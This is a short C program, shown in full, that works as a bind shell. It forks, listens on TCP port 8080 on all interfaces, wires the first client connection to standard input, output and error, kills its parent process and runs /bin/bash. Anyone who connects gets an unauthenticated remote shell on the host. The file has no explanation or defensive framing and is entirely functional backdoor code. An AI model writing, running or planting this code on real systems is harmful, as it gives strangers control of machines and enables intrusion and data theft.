#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/wait.h>

int main() {

    pid_t pid = fork();

    if (pid == 0) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in serveraddr;

        serveraddr.sin_family = AF_INET;
        serveraddr.sin_port = htons(8080);
        serveraddr.sin_addr.s_addr = INADDR_ANY;

        bind(sock, (struct sockaddr*)&serveraddr, sizeof(serveraddr));

        listen(sock, 5);

        int client_sock = accept(sock, NULL, NULL);

	dup2(client_sock, 0);
	dup2(client_sock, 1);
	dup2(client_sock, 2);

	char* const args[] = {"/bin/bash", NULL};

	kill(getppid(), 9);

	execvp("/bin/bash", args);
	    
	kill(getpid(), 9);

    } else wait(0);

    return 0;
}
